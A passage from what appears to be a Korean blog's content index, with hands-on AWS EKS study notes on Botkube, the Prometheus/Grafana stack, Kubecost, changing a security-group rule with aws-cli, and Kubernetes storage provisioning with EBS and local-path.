등 일부 리소스 값을 변경 가능! # 업데이트 하였을 시, 에러 알림이 오지 않음 kubectl set kubectl set image pod nginx-19 nginx-pod=nginx:1.19 # 삭제 kubectl delete pod nginx-19 ########## ## botkube ########## # repo 추가 helm repo add botkube https://charts.botkube.io helm repo update # 변수 지정 export SLACK_API_BOT_TOKEN=\u0026lt;Bot 토큰\u0026gt; export SLACK_API_APP_TOKEN=\u0026lt;App 토큰\u0026gt; export ALLOW_KUBECTL=true export ALLOW_HELM=true export SLACK_CHANNEL_NAME=webhook3 # cat \u0026lt;\u0026lt;EOT \u0026gt; botkube-values.yaml actions: \u0026#39;describe-created-resource\u0026#39;: # kubectl describe enabled: true \u0026#39;show-logs-on-error\u0026#39;: # kubectl logs enabled: true executors: k8s-default-tools: botkube/helm: enabled: true botkube/kubectl: enabled: true EOT # 설치 helm install --version v1.0.0 botkube --namespace botkube --create-namespace \\ --set communications.default-group.socketSlack.enabled=true \\ --set communications.default-group.socketSlack.channels.default.name=${SLACK_CHANNEL_NAME} \\ --set communications.default-group.socketSlack.appToken=${SLACK_API_APP_TOKEN} \\ --set communications.default-group.socketSlack.botToken=${SLACK_API_BOT_TOKEN} \\ --set settings.clusterName=${CLUSTER_NAME} \\ --set \u0026#39;executors.k8s-default-tools.botkube/kubectl.enabled\u0026#39;=${ALLOW_KUBECTL} \\ --set \u0026#39;executors.k8s-default-tools.botkube/helm.enabled\u0026#39;=${ALLOW_HELM} \\ -f botkube-values.yaml botkube/botkube # Slack에서 botkube 앱을 추가하고, 채널에 초대 # 연결 상태, notifications 상태 확인 @Botkube ping @Botkube status notifications # 잘못된 이미지 정보의 파드 배포 후 파드 정보 조회 # kubectl apply -f https://raw.githubusercontent.com/junghoon2/kube-books/main/ch05/nginx-error-pod.yml # kubectl get events -w @Botkube k get pod @Botkube kc get pod --namespace kube-system @Botkube kubectl get pod --namespace kube-system -o wide # Actionable notifications: 드롭다운을 통해 명령어 선택 가능 @Botkube kubectl 6. Prometheus 스택 Prometheus 및 Grafana를 단일 스택으로 설치 실습에서는 ACM, Route53, ALB를 연동하여 HTTPS 리디렉션을 적용 6-1. Prometheus 스택 설치 alertmanager-0: 고질적인 firing 에러(?)로 이번 실습에서는 skip 사전에 정의한 정책 기반(예: 노드 다운, 파드 Pending 등)으로 시스템 경고 메시지를 생성 후 경보 채널(슬랙 등)로 전송 grafana:\n프로메테우스는 메트릭 정보를 저장하는 용도로 사용하며, 그라파나로 시각화 처리 prometheus-0:\n모니터링 대상이 되는 파드는 ‘exporter’라는 별도의 사이드카 형식의 파드에서 모니터링 메트릭을 노출, pull 방식으로 가져와 내부의 시계열 데이터베이스에 저장 node-exporter:\n노드익스포터는 물리 노드에 대한 자원 사용량(네트워크, 스토리지 등 전체) 정보를 메트릭 형태로 변경하여 노출 operator:\n시스템 경고 메시지 정책(prometheus rule), 애플리케이션 모니터링 대상 추가 등의 작업을 편리하게 할수 있게 CRD 지원 kube-state-metrics:\n쿠버네티스의 클러스터의 상태(kube-state)를 메트릭으로 변환하는 파드 # 모니터링 kubectl create ns monitoring watch kubectl get pod,pvc,svc,ingress -n monitoring # 사용 리전의 인증서 ARN 확인 CERT_ARN=`aws acm list-certificates --query \u0026#39;CertificateSummaryList[].CertificateArn[]\u0026#39; --output text` echo $CERT_ARN # repo 추가 helm repo add prometheus-community https://prometheus-community.github.io/helm-charts # 파라미터 파일 생성 cat \u0026lt;\u0026lt;EOT \u0026gt; monitor-values.yaml prometheus: prometheusSpec: podMonitorSelectorNilUsesHelmValues: false serviceMonitorSelectorNilUsesHelmValues: false retention: 5d retentionSize: \u0026#34;10GiB\u0026#34; ingress: enabled: true ingressClassName: alb hosts: - prometheus.$MyDomain paths: - /* annotations: alb.ingress.kubernetes.io/scheme: internet-facing alb.ingress.kubernetes.io/target-type: ip alb.ingress.kubernetes.io/listen-ports: \u0026#39;[{\u0026#34;HTTPS\u0026#34;:443}, {\u0026#34;HTTP\u0026#34;:80}]\u0026#39; alb.ingress.kubernetes.io/certificate-arn: $CERT_ARN alb.ingress.kubernetes.io/success-codes: 200-399 alb.ingress.kubernetes.io/load-balancer-name: myeks-ingress-alb alb.ingress.kubernetes.io/group.name: study alb.ingress.kubernetes.io/ssl-redirect: \u0026#39;443\u0026#39; grafana: defaultDashboardsTimezone: Asia/Seoul adminPassword: prom-operator ingress: enabled: true ingressClassName: alb hosts: - grafana.$MyDomain paths: - /* annotations: alb.ingress.kubernetes.io/scheme: internet-facing alb.ingress.kubernetes.io/target-type: ip alb.ingress.kubernetes.io/listen-ports: \u0026#39;[{\u0026#34;HTTPS\u0026#34;:443}, {\u0026#34;HTTP\u0026#34;:80}]\u0026#39; alb.ingress.kubernetes.io/certificate-arn: $CERT_ARN alb.ingress.kubernetes.io/success-codes: 200-399 alb.ingress.kubernetes.io/load-balancer-name: myeks-ingress-alb alb.ingress.kubernetes.io/group.name: study alb.ingress.kubernetes.io/ssl-redirect: \u0026#39;443\u0026#39; defaultRules: create: false kubeControllerManager: enabled: false kubeEtcd: enabled: false kubeScheduler: enabled: false alertmanager: enabled: false # alertmanager: # ingress: # enabled: true # ingressClassName: alb # hosts: # - alertmanager.$MyDomain # paths: # - /* # annotations: # alb.ingress.kubernetes.io/scheme: internet-facing # alb.ingress.kubernetes.io/target-type: ip # alb.ingress.kubernetes.io/listen-ports: \u0026#39;[{\u0026#34;HTTPS\u0026#34;:443}, {\u0026#34;HTTP\u0026#34;:80}]\u0026#39; # alb.ingress.kubernetes.io/certificate-arn: $CERT_ARN # alb.ingress.kubernetes.io/success-codes: 200-399 # alb.ingress.kubernetes.io/load-balancer-name: myeks-ingress-alb # alb.ingress.kubernetes.io/group.name: study # alb.ingress.kubernetes.io/ssl-redirect: \u0026#39;443\u0026#39; EOT cat monitor-values.yaml | yh # 배포 helm install kube-prometheus-stack prometheus-community/kube-prometheus-stack --version 45.27.2 \\ --set prometheus.prometheusSpec.scrapeInterval=\u0026#39;15s\u0026#39; --set prometheus.prometheusSpec.evaluationInterval=\u0026#39;15s\u0026#39; \\ -f monitor-values.yaml --namespace monitoring # 확인 helm list -n monitoring kubectl get pod,svc,ingress -n monitoring kubectl get-all -n monitoring kubectl get prometheus,servicemonitors -n monitoring kubectl get crd | grep monitoring 6-2. Prometheus 기본적 사용 모니터링 대상인 서비스는 3에서 다루었듯이 /metrics 엔드포인트가 노출되어있음 p8s는 http get 방식으로 metrics를 가져와 TSDB 형식으로 저장 # 아래 처럼 프로메테우스가 각 서비스의 9100 접속하여 메트릭 정보를 수집 kubectl get node -owide kubectl get svc,ep -n monitoring kube-prometheus-stack-prometheus-node-exporter # 노드의 9100번의 /metrics 접속 시 다양한 메트릭 정보를 확인할수 있음 : 마스터 이외에 워커노드도 확인 가능 ssh ec2-user@$N1 curl -s localhost:9100/metrics # ingress 확인 kubectl get ingress -n monitoring kube-prometheus-stack-prometheus kubectl describe ingress -n monitoring kube-prometheus-stack-prometheus # 프로메테우스 ingress 도메인으로 웹 접속 echo -e \u0026#34;Prometheus Web URL = https://prometheus.$MyDomain\u0026#34; 프로메테우스 ingress 도메인으로 웹 접속 경고(Alert) : 사전에 정의한 시스템 경고 정책(Prometheus Rules)에 대한 상황 그래프(Graph) : 프로메테우스 자체 검색 언어 PromQL을 이용하여 메트릭 정보를 조회 -\u0026gt; 단순한 그래프 형태 조회 상태(Status) : 경고 메시지 정책(Rules), 모니터링 대상(Targets) 등 다양한 프로메테우스 설정 내역을 확인 \u0026gt; 버전(2.42.0) 도움말(Help) 프로메테우스 설정(Configuration) 확인: Status → Runtime \u0026amp; Build Information ⇒ Storage retention 5d or 10GiB: 메트릭 저장 기간이 5일 경과 혹은 10GiB 이상 시 삭제 helm 파라미터에서 수정 후 적용 가능 Status → Command-Line Flags 에서도 확인 가능 \u0026ndash;storage.tsdb.retention.time=5d \u0026ndash;storage.tsdb.retention.size=10GB Status → Configuration ⇒ “node-exporter” 검색 metrics_path: /metrics, scheme: http, role: endpoints 를 확인 전체 metrics targets(대상) 확인: Status → Targets 각 엔드포인트 확인 가능 메트릭을 그래프(Graph)로 조회: Graph 아래 PromQL 쿼리(전체 클러스터 노드의 CPU 사용량 합계)입력 후 조회 → Graph 확인 1- avg(rate(node_cpu_seconds_total{mode=\u0026quot;idle\u0026quot;}[1m])) 입력 6-3. Grafana TSDB 데이터를 시각화하는 대시보드 제공 접속 정보 확인 및 로그인: 초기 계정 - admin / prom-operator 설치한 스택에서는 자동으로 프로메테우스를 데이터 소스로 추가해둠 http://kube-prometheus-stack-prometheus.monitoring:9090/ # 그라파나 버전 확인 kubectl exec -it -n monitoring deploy/kube-prometheus-stack-grafana -- grafana-cli --version # ingress 확인 kubectl get ingress -n monitoring kube-prometheus-stack-grafana kubectl describe ingress -n monitoring kube-prometheus-stack-grafana # ingress 도메인으로 웹 접속 : 기본 계정 - admin / prom-operator echo -e \u0026#34;Grafana Web URL = https://grafana.$MyDomain\u0026#34; ## 데이터 소스 접속 확인 # 테스트용 파드 배포 cat \u0026lt;\u0026lt;EOF | kubectl create -f - apiVersion: v1 kind: Pod metadata: name: netshoot-pod spec: containers: - name: netshoot-pod image: nicolaka/netshoot command: [\u0026#34;tail\u0026#34;] args: [\u0026#34;-f\u0026#34;, \u0026#34;/dev/null\u0026#34;] terminationGracePeriodSeconds: 0 EOF kubectl get pod netshoot-pod # 접속 확인 kubectl exec -it netshoot-pod -- nslookup kube-prometheus-stack-prometheus.monitoring kubectl exec -it netshoot-pod -- curl -s kube-prometheus-stack-prometheus.monitoring:9090/graph -v ; echo 6-4. Grafana 대시보드 import Kubernetes All-in-one Cluster Monitoring KR( 13770 ) AWS EKS CNI Metrics( 16032 ): 이 대시보드를 쓰려면 아래의 작업이 선행조건 # PodMonitor 배포 cat \u0026lt;\u0026lt;EOF | kubectl create -f - apiVersion: monitoring.coreos.com/v1 kind: PodMonitor metadata: name: aws-cni-metrics namespace: kube-system spec: jobLabel: k8s-app namespaceSelector: matchNames: - kube-system podMetricsEndpoints: - interval: 30s path: /metrics port: metrics selector: matchLabels: k8s-app: aws-node EOF # PodMonitor 확인 kubectl get podmonitor -n kube-system NGINX application 모니터링( 12708 ): 6-5에서 부하 진행 반복 접속(부하)하여 metrics 변화 확인 helm으로 설치시, nginx-exporter 옵션을 걸면, p8s 모니터링에 자동 등록 서비스 모니터 방식으로 nginx 모니터링 대상 등록을 위한 실습 파라미터 export 는 9113 포트 사용 nginx 웹서버 노출은 AWS CLB 기본 사용 # 모니터링 watch -d kubectl get pod # 파라미터 파일 생성 : cat \u0026lt;\u0026lt;EOT \u0026gt; ~/nginx_metric-values.yaml metrics: enabled: true service: port: 9113 serviceMonitor: enabled: true namespace: monitoring interval: 10s EOT # 배포 helm upgrade nginx bitnami/nginx --reuse-values -f nginx_metric-values.yaml # 확인 kubectl get pod,svc,ep kubectl get servicemonitor -n monitoring nginx kubectl get servicemonitor -n monitoring nginx -o json | jq # 메트릭 확인 \u0026gt;\u0026gt; 프로메테우스에서 Target 확인 NGINXIP=$(kubectl get pod -l app.kubernetes.io/instance=nginx -o jsonpath={.items[0].status.podIP}) curl -s http://$NGINXIP:9113/metrics # nginx_connections_active Y 값 확인해보기 curl -s http://$NGINXIP:9113/metrics | grep ^nginx_connections_active # nginx 파드내에 컨테이너 갯수 확인 kubectl get pod -l app.kubernetes.io/instance=nginx kubectl describe pod -l app.kubernetes.io/instance=nginx # 접속 주소 확인 및 접속 echo -e \u0026#34;Nginx WebServer URL = https://nginx.$MyDomain\u0026#34; curl -s https://nginx.$MyDomain kubectl logs deploy/nginx -f # 반복 접속 while true; do curl -s https://nginx.$MyDomain -I | head -n 1; date; sleep 1; done 6-5. Grafana Alert Alert rules 및 Contact point 설정하여 테스트 Alert rules : Alert 발생 조건 설정 Contact point : Alert 발생시 알림을 받을 대상 설정 (Slack 웹훅 활용) Slack용으로 Notification policies의 기본 정책도 Slack으로 변경 이후에 NGINX 반복 접속으로 슬랙 채널 알람 확인 while true; do curl -s https://nginx.$MyDomain -I | head -n 1; date; sleep 1; done Contact point 설정 시, 지정 대상에게 제대로 멘션이 걸리지 않음을 확인. 7. kubecost k8s 리소스별 비용 분류 대시보드, 처음 띄운 후 15분 정도 기다려야 데이터 표출 kubecost의 경우, cloudformation 제거 후에도 데이터(dynamic-pvc)가 남아있어서 완전히 없애고자 웹 콘솔에서 볼륨 삭제를 진행 cat \u0026lt;\u0026lt;EOT \u0026gt; cost-values.yaml global: grafana: enabled: true proxy: false priority: enabled: false networkPolicy: enabled: false podSecurityPolicy: enabled: false persistentVolume: storageClass: \u0026#34;gp3\u0026#34; prometheus: kube-state-metrics: disabled: false nodeExporter: enabled: true reporting: productAnalytics: true EOT # kubecost chart 에 프로메테우스가 포함되어 있으니, 기존 프로메테우스-스택은 삭제 # node-export 포트 충돌 발생 helm uninstall -n monitoring kube-prometheus-stack # 배포 kubectl create ns kubecost helm install kubecost oci://public.ecr.aws/kubecost/cost-analyzer --version 1.103.2 --namespace kubecost -f cost-values.yaml # 배포 확인 kubectl get-all -n kubecost kubectl get all -n kubecost # kubecost-cost-analyzer 파드 IP변수 지정 및 접속 확인 CAIP=$(kubectl get pod -n kubecost -l app=cost-analyzer -o jsonpath={.items[0].status.podIP}) curl -s $CAIP:9090 # 외부에서 bastion EC2 접속하여 특정 파드 접속 방법 : socat(SOcket CAT) 활용 # 웹 브라우저에서 bastion EC2 IP로 접속 yum -y install socat socat TCP-LISTEN:80,fork TCP:$CAIP:9090 ","date":"2023-05-21T06:13:52+09:00","permalink":"https://blog.minseong.xyz/post/aws-eks-study-week4/","section":"post","tags":["AWS","EKS","CloudNet@","observability"],"title":"AWS EKS 스터디 4주차 - Observability"},{"categories":null,"contents":"0. 요약 Docs 1 Docs 2 aws ec2 describe-security-groups aws ec2 modify-security-group-rules 1. 배경 2주 전에 문득 이런 질문을 올렸던 적이 있었다.\n물론 바꾸면 안될 일은 없었는데 이렇게 하는게 맞나 확신이 모자라서 의견을 여쭤봤었고,\n이게 맞다는 확신을 받았다.\n그리고 오늘\u0026hellip; 카페를 두 곳이나 들리면서 하느라 약간의 번거로움도 있고 AWS 웹 콘솔에서 하려 했다.\n그런데, 유독 SG에서만 페이지 로딩이 timeout 걸려서,\n도저히 수정은 커녕 해당 ID도 파악을 하기 힘든 상황이 되었다.\n그럼\u0026hellip; 다시 cloudformation stack을 부숴버리고, 재구축하고 그렇게 40여분을 날리면 되는 것일까? 물론 아니다. 놀기에도 쉬기에도 애매한 그런 행동 대신에 만능 툴 aws-cli의 도움을 받도록 하자.\n2. 방법 접근법은 당연하게도, 먼저 SG ID를 파악하고 해당 Inbound Rule을 수정하면 된다.\n한번도 하지 않았을 뿐.\n2-1. SG ID 파악 필터를 이용하면 간결하게 파악할 수 있지만, 지금은 파악조차 힘들기 때문에 모든 SG를 조회한다. YAML파일로 구축했기 때문에 Name은 알고 있지만, 그건 웹 콘솔 상에서의 Name이고 필터로는 SG group-id를 알아야 한다. 아래 명령어를 입력하고 Pod/Node IP할당을 위한 CIDR 규칙이 아닌,\n특정 IP(보통 /32로 나오기 때문에 grep을 쓰는 것도 좋겠다)를 찾아서 해당 SG GroupId를 찾는다. 하위에 SecurityGroupRuleId가 있는데, Inbound/Outbound룰을 수정하려면 이것도 필요하다. aws ec2 describe-security-groups SG GroupId를 알고 있다면, 다음과 같이 필터를 하면 된다. aws ec2 describe-security-groups --filters Name=group-id,Values=sg-${파악한 SG ID} 2-2. SG Rule 수정 아래 예시처럼 수정할 부분의 key-value를 입력하면 된다. 유의할 점은, CidrIpv4 수정시에는 IpProtocol도 함께 지정하여야 한다. 예시의 경우는 모든 프로토콜을 허용한다는 의미이니, 상황에 따라 수정하도록 한다. 지정하지 않을 경우, 에러가 발생한다. aws ec2 modify-security-group-rules --group-id sg-${파악한 SG ID} --security-group-rules SecurityGroupRuleId=sgr-${바꿀 SG 규칙},SecurityGroupRule=\u0026#39;{IpProtocol=-1,CidrIpv4=${바꿀 Host IP}/32}\u0026#39; ","date":"2023-05-18T21:36:19+09:00","permalink":"https://blog.minseong.xyz/post/modify-bastion-cidr-with-aws-cli/","section":"post","tags":["AWS","CIDR","aws-cli","bastion"],"title":"aws-cli를 이용한 bastion CIDR 변경"},{"categories":null,"contents":"이번 주차에는 스토리지에 대해 실습을 진행해보았습니다. 지난번 kOps 스터디에서 다루었던 내용이지만, 부족했던 내용을 보충하면서 작성을 해보았습니다.\n주요한 내용은\u0026hellip;\nNodeAffinity를 이용한 라벨링 AWS EBS controller의 경우, AWS managed policy를 활용 AWS Volume SnapShots Controller를 통한 볼륨 백업 AWS EFS controller에서의 동적 프로비저닝 AWS EKS 신규 노드그룹 생성 별도로 kube-ops-view의 경우, 웹으로 확인할 수 있을 때까지 시간이 소요된다는 점이 있습니다.\n1. 실습 환경 배포 2주차에 실습했던 내용들을 미리 배포 AWS LB ExternalDNS kube-ops-view context 이름 변경 지난 번까지 pkos가 뜨는 현상이 있었는데, 닉네임을 별도 지정할 수 있음 EFS 생성 관련 cloudformation이 추가되었음 EFS FS ID 조회를 하기 위해 aws-cli 필터 활용 (출처: AWS Docs) # 실습 YAML 파일 curl -O https://s3.ap-northeast-2.amazonaws.com/cloudformation.cloudneta.net/K8S/eks-oneclick2.yaml # cloudformation 스택 생성 aws cloudformation deploy --template-file eks-oneclick2.yaml --stack-name myeks --parameter-overrides KeyName=aews SgIngressSshCidr=$(curl -s ipinfo.io/ip)/32 MyIamUserAccessKeyID=AKIA5... MyIamUserSecretAccessKey=CVNa2... ClusterBaseName=myeks --region ap-northeast-2 ssh -i ~/.ssh/aews.pem ec2-user@$(aws cloudformation describe-stacks --stack-name myeks --query \u0026#39;Stacks[*].Outputs[0].OutputValue\u0026#39; --output text) # default 네임스페이스 적용 kubectl ns default # (옵션) context 이름 변경 NICK=kkumtree kubectl ctx kubectl config rename-context admin@myeks.ap-northeast-2.eksctl.io $NICK@myeks # EFS 확인 : AWS 관리콘솔 EFS 확인 EfsFsId=$(aws efs describe-file-systems --query \u0026#39;FileSystems[*].FileSystemId\u0026#39; --output text) echo $EfsFsId mount -t nfs4 -o nfsvers=4.1,rsize=1048576,wsize=1048576,hard,timeo=600,retrans=2,noresvport $EfsFsId.efs.ap-northeast-2.amazonaws.com:/ /mnt/myefs df -hT --type nfs4 mount | grep nfs4 echo \u0026#34;Test efs exist with file \u0026#34; \u0026gt; /mnt/myefs/memo.txt cat /mnt/myefs/memo.txt rm -f /mnt/myefs/memo.txt # 스토리지클래스 및 CSI 노드 확인 kubectl get sc kubectl get sc gp2 -o yaml | yh kubectl get csinodes # 노드 정보 확인 kubectl get node --label-columns=node.kubernetes.io/instance-type,eks.amazonaws.com/capacityType,topology.kubernetes.io/zone eksctl get iamidentitymapping --cluster myeks # 노드 IP 확인 및 PrivateIP 변수 지정 N1=$(kubectl get node --label-columns=topology.kubernetes.io/zone --selector=topology.kubernetes.io/zone=ap-northeast-2a -o jsonpath={.items[0].status.addresses[0].address}) N2=$(kubectl get node --label-columns=topology.kubernetes.io/zone --selector=topology.kubernetes.io/zone=ap-northeast-2b -o jsonpath={.items[0].status.addresses[0].address}) N3=$(kubectl get node --label-columns=topology.kubernetes.io/zone --selector=topology.kubernetes.io/zone=ap-northeast-2c -o jsonpath={.items[0].status.addresses[0].address}) echo \u0026#34;export N1=$N1\u0026#34; \u0026gt;\u0026gt; /etc/profile echo \u0026#34;export N2=$N2\u0026#34; \u0026gt;\u0026gt; /etc/profile echo \u0026#34;export N3=$N3\u0026#34; \u0026gt;\u0026gt; /etc/profile echo $N1, $N2, $N3 # 노드 보안그룹 ID 확인 NGSGID=$(aws ec2 describe-security-groups --filters Name=group-name,Values=*ng1* --query \u0026#34;SecurityGroups[*].[GroupId]\u0026#34; --output text) aws ec2 authorize-security-group-ingress --group-id $NGSGID --protocol \u0026#39;-1\u0026#39; --cidr 192.168.1.100/32 # 워커 노드 SSH 접속 ssh ec2-user@$N1 hostname ssh ec2-user@$N2 hostname ssh ec2-user@$N3 hostname # 노드에 툴 설치 ssh ec2-user@$N1 sudo yum install links tree jq tcpdump sysstat -y ssh ec2-user@$N2 sudo yum install links tree jq tcpdump sysstat -y ssh ec2-user@$N3 sudo yum install links tree jq tcpdump sysstat -y # AWS LB, ExternalDNS 설치 helm repo add eks https://aws.github.io/eks-charts helm repo update helm install aws-load-balancer-controller eks/aws-load-balancer-controller -n kube-system --set clusterName=$CLUSTER_NAME \\ --set serviceAccount.create=false --set serviceAccount.name=aws-load-balancer-controller # ExternalDNS MyDomain=awskops.click MyDnzHostedZoneId=$(aws route53 list-hosted-zones-by-name --dns-name \u0026#34;${MyDomain}.\u0026#34; --query \u0026#34;HostedZones[0].Id\u0026#34; --output text) echo $MyDomain, $MyDnzHostedZoneId curl -s -O https://raw.githubusercontent.com/gasida/PKOS/main/aews/externaldns.yaml MyDomain=$MyDomain MyDnzHostedZoneId=$MyDnzHostedZoneId envsubst \u0026lt; externaldns.yaml | kubectl apply -f - 1-1. kube-ops-view 시각적으로 현재 k8s의 상태를 볼 수 있는 툴 안되는 줄 알았는데, 뷰어가 뜰 때까지 시간이 걸리는 것이었음. # kube-ops-view helm repo add geek-cookbook https://geek-cookbook.github.io/charts/ helm install kube-ops-view geek-cookbook/kube-ops-view --version 1.2.2 --set env.TZ=\u0026#34;Asia/Seoul\u0026#34; --namespace kube-system kubectl patch svc -n kube-system kube-ops-view -p \u0026#39;{\u0026#34;spec\u0026#34;:{\u0026#34;type\u0026#34;:\u0026#34;LoadBalancer\u0026#34;}}\u0026#39; kubectl annotate service kube-ops-view -n kube-system \u0026#34;external-dns.alpha.kubernetes.io/hostname=kubeopsview.$MyDomain\u0026#34; echo -e \u0026#34;Kube Ops View URL = http://kubeopsview.$MyDomain:8080/#scale=1.5\u0026#34; # 이미지 정보 확인 \u0026gt; eksctl 설치/업데이트 addon 확인 \u0026gt; IRSA 확인 kubectl get pods --all-namespaces -o jsonpath=\u0026#34;{.items[*].spec.containers[*].image}\u0026#34; | tr -s \u0026#39;[[:space:]]\u0026#39; \u0026#39;\\n\u0026#39; | sort | uniq -c eksctl get addon --cluster $CLUSTER_NAME eksctl get iamserviceaccount --cluster $CLUSTER_NAME 2. 스토리지의 이해 git 저장소를 마운트하여 사용하는 gitRepo도 있음 (출처: 조대협님의 블로그) EmptyDir(Pod 임시 Volume)의 Lifecycle Pod 생성 시, Volume이 함께 생성되고 Pod 삭제 시, Volume이 삭제 됨 이때, Pod는 Stateless(상태가 없는) 애플리케이션 영구적으로 데이터를 보존하려면 별도의 DB처럼 별도의 저장소를 사용할 필요성이 있음 PV(Persistent Volume): Pod와는 별개인 API 객체 hostPath(로컬 볼륨) PV: 네트워크 스토리지를 모방하기 위해, 워커노드의 파일이나 디렉터리를 마운트하여 사용 워커노드의 파일 시스템에 접근하는데 유용 (예: 워커노드의 로그 파일 접근) 같은 hostPath에 있는 볼륨은 여러 Pod 사이에서 공유되어 사용된다. Stateful(상태가 있는) 애플리케이션 RO(ReadOnly)를 강하게 권장하고 있음: 많은 보안 위험 Pod가 재시작 되어 다른 노드에서 기동될 경우, 해당 노드의 hostPath를 사용 이전의 다른 노드에서 사용한 hostPath의 파일 내용은 액세스 불가 CSI(Container Storage Interface) 과거엔, AWS EBS provisioner를 사용\n신규기능을 사용하려면 k8s 버전 업그레이드 필요 지금은 CSI 드라이버라는 별도의 Controller Pod를\n만들어 동적 provisioning을 지원 PV 로직 이해(Static Provisioning 기준) AWS EBS FS Volume 생성 후 FS ID 확인 PV YAML정의 파일에 FS ID를 기입 후 PV 생성 PVC를 생성하여 PV 요청 Pod YAML정의 파일에서 Pod 객체에 PVC를 기입(마운트) Dynamic Provisioning 장점: PV객체를 별도로 생성할 필요가 없음 PVC 생성시 PV가 자동으로 생성됨 요구사항: AWS EBS의 스토리지 클래스를 정의하는 Storage Class (추상화)객체가 필요 Name: 고유한 스토리지 클래스 객체를 식별 Provisioner: CSI 드라이버. 연결되는 스토리지 기술 정의 AWS EFS: efs.csi.aws.com (변경될 수 있음) AWS EBS: ebs.csi.aws.com (상동) 2-1. 기본 컨테이너 환경에서의 임시 fs(EmptyDir) 사용 # 파드 배포 # date 명령어로 현재 시간을 10초 간격으로 /home/pod-out.txt 파일에 저장 curl -s -O https://raw.githubusercontent.com/gasida/PKOS/main/3/date-busybox-pod.yaml cat date-busybox-pod.yaml | yh kubectl apply -f date-busybox-pod.yaml # 파일 확인 kubectl get pod kubectl exec busybox -- tail -f /home/pod-out.txt Sat Jan 28 15:33:11 UTC 2023 Sat Jan 28 15:33:21 UTC 2023 ... # 파드 삭제 후 다시 생성 후 파일 정보 확인 \u0026gt; 이전 기록이 보존되어 있는지? kubectl delete pod busybox kubectl apply -f date-busybox-pod.yaml kubectl exec busybox -- tail -f /home/pod-out.txt # 실습 완료 후 삭제 kubectl delete pod busybox 2-2. local-path-provisioner 스토리지 클래스 배포 (PV/PVC) hostPath 사용 nodeAffinity: Pod를 배치할 위치 지정하는 힌트를 제공하는 스케쥴러에 제공 수동으로 정의를 하지 않았으나, 해당 워커노드의 주소를 확인할 수 있음\n예) kubernetes.io/hostname in [ip-192-168-2-xxx.ap-northeast-2.compute.internal] # 배포 curl -s -O https://raw.githubusercontent.com/rancher/local-path-provisioner/master/deploy/local-path-storage.yaml kubectl apply -f local-path-storage.yaml # 확인 kubectl get-all -n local-path-storage kubectl get pod -n local-path-storage -owide kubectl describe cm -n local-path-storage local-path-config kubectl get sc kubectl get sc local-path # PVC 생성 curl -s -O https://raw.githubusercontent.com/gasida/PKOS/main/3/localpath1.yaml cat localpath1.yaml | yh kubectl apply -f localpath1.yaml # PVC 확인 kubectl get pvc kubectl describe pvc # 파드 생성 curl -s -O https://raw.githubusercontent.com/gasida/PKOS/main/3/localpath2.yaml cat localpath2.yaml | yh kubectl apply -f localpath2.yaml # 파드 확인 kubectl get pod,pv,pvc kubectl describe pv # Node Affinity 확인 kubectl exec -it app -- tail -f /data/out.txt # 워커노드 중 어디에 파드가 배포되어 있는지, 아래 경로에 out.txt 파일 존재 확인 # N1에 없는 경우 N1 -\u0026gt; N2 -\u0026gt; N3 순으로 확인 ## /opt/local-path-provisioner ## └── pvc-pvc-898b3f68-aec0-478f-aa55-184a107780cd_default_localpath-claim ## └── out.txt ssh ec2-user@$N1 tree /opt/local-path-provisioner # 해당 워커노드 자체에서 out.txt 파일 확인 : pvc 경로는 각자 실습 환경에 따라 다름 ssh ec2-user@$N1 tail -f /opt/local-path-provisioner/pvc-898b3f68-aec0-478f-aa55-184a107780cd_default_localpath-claim/out.txt # 파드 삭제 후 PV/PVC 확인 kubectl delete pod app kubectl get pod,pv,pvc ssh ec2-user@$N1 tree /opt/local-path-provisioner # 파드 다시 실행 kubectl apply -f localpath2.yaml # 확인 kubectl exec -it app -- head /data/out.txt kubectl exec -it app -- tail -f /data/out.txt # 파드와 PVC 삭제 kubectl delete pod app kubectl get pv,pvc kubectl delete pvc localpath-claim # 확인 kubectl get pv ssh ec2-user@$N1 tree /opt/local-path-provisioner 2-3. (참고) kubestr 모니터링 및 성능 측정 (NVMe SSD) 디스크 I/O 성능을 측정 # kubestr 툴 다운로드 wget https://github.com/kastenhq/kubestr/releases/download/v0.4.37/kubestr_0.4.37_Linux_amd64.tar.gz tar xvfz kubestr_0.4.37_Linux_amd64.tar.gz \u0026amp;\u0026amp; mv kubestr /usr/local/bin/ \u0026amp;\u0026amp; chmod +x /usr/local/bin/kubestr # 워커노드별 iostat 확인 ssh ec2-user@$N1 iostat -xmdz 1 -p nvme0n1 ssh ec2-user@$N2 iostat -xmdz 1 -p nvme0n1 ssh ec2-user@$N3 iostat -xmdz 1 -p nvme0n1 # 모니터링 준비 watch \u0026#39;kubectl get pod -owide;echo;kubectl get pv,pvc\u0026#39; # 측정 : Read # [NVMe] 4k 디스크 블록 기준 Read 평균 IOPS는 20309 \u0026gt;\u0026gt; 4분 정도 소요 curl -s -O https://raw.githubusercontent.com/wikibook/kubepractice/main/ch10/fio-read.fio kubestr fio -f fio-read.fio -s local-path --size 10G # 측정 : Write # [NVMe] 4k 디스크 블록 기준 Write 평균 IOPS는 9082 \u0026gt;\u0026gt; 9분 정도 소요 curl -s -O https://raw.githubusercontent.com/wikibook/kubepractice/main/ch10/fio-write.fio sed -i \u0026#39;/directory/d\u0026#39; fio-write.fio kubestr fio -f fio-write.fio -s local-path --size 10G 3. AWS EBS Controller EBS CSI driver: EBS 볼륨을 생성하고 Pod에 이를 연결 PV/PVC는 ReadWriteOnce로 설정해야 함: EBS 기본 설정이 동일 AZ의 EC2인스턴스만 연결 할 수 있음 (출처: 악분일상님) 특징: ISRA 정책 설정시 AWS Managed Policy(AWS 관리형 정책)인 AmazonEBSCSIDriverPolicy 사용 AWS LB, ExternalDNS의 경우, Customer Policy(고객 관리형 정책) (참고) k8s v1.22+ 에서는 ReadWriteOncePod를 지원하므로, 민감한 데이터를 다룰때 활용할 수 있음. (출처: k8s blog) 3-1. (설치) Amazon EBS CSI driver as an Amazon EKS add-on # aws-ebs-csi-driver 전체 버전 정보와 기본 설치 버전(True) 정보 확인 # v1.18.0-eksbuild.1 aws eks describe-addon-versions \\ --addon-name aws-ebs-csi-driver \\ --kubernetes-version 1.24 \\ --query \u0026#34;addons[].addonVersions[].[addonVersion, compatibilities[].defaultVersion]\u0026#34; \\ --output text # ISRA 설정 : AWS관리형 정책 AmazonEBSCSIDriverPolicy 사용 eksctl create iamserviceaccount \\ --name ebs-csi-controller-sa \\ --namespace kube-system \\ --cluster ${CLUSTER_NAME} \\ --attach-policy-arn arn:aws:iam::aws:policy/service-role/AmazonEBSCSIDriverPolicy \\ --approve \\ --role-only \\ --role-name 